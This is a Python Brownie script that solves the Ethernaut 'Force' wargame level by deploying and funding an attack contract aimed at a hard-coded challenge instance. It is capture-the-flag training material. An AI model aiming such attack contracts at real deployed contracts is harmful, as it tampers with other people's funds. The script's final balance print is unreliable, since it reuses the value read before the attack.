from scripts.helpful_scripts import get_account
from brownie import web3, Attack07
from web3 import Web3

# PLAYER address is "0xF8f8269488f73fab3935555FCDdD6035699deE25"

ETHERNAUT_INSTANCE = "0x6f50CaAf6E4AD72C66E0e60A61eEF58Db2018447"
BALANCE = web3.eth.getBalance(ETHERNAUT_INSTANCE)


def main():

    player = get_account()

    print(f"\nBalance of Force contract = {BALANCE}\n")

    attack_contract = Attack07.deploy({"from": player})
    print(f"Attack contract dployed at: {attack_contract}")

    player.transfer(to=attack_contract, amount=1000000000000000)

    attack_contract.attack(ETHERNAUT_INSTANCE)
    print(f"Balance of Force contract = {BALANCE}\n")
